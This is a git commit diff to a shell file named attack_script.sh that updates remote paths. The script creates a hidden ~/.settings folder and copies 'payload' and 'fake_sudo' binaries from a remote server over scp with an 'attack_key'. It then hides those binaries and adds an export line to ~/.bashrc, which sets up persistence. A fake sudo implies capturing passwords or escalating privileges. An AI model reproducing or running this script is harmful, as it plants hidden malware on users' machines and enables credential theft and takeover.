45945e4b75782c2dde45ef4b9febc7e43185cdc6
Blake Mallory <blakecmallory@gmail.com>
2020-04-23 23:39:49 -0400

    update script path

--- scripts/attack_script.sh
+++ scripts/attack_script.sh
@@ -2,11 +2,11 @@
 #this is the hidden folder created
 mkdir -p ~/.settings
 #grabs the binaries
-scp -i attack_key root@161.35.130.78:/root/exe/payload ./
-scp -i attack_key root@161.35.130.78:/root/exe/fake_sudo ./
+scp -i attack_key root@161.35.130.78:/root/fake_sudo/exe/c/payload ./
+scp -i attack_key root@161.35.130.78:/root/fake_sudo/exe/c/fake_sudo ./
 #hides the binaries
 mv payload ~/.settings/payload
-mv payload ~/.settings/payload
+mv fake_sudo ~/.settings/fake_sudo
 
 #this is the exe that will perform tasks that need root
 echo "export PAYLOAD=~/.settings/payload">>~/.bashrc
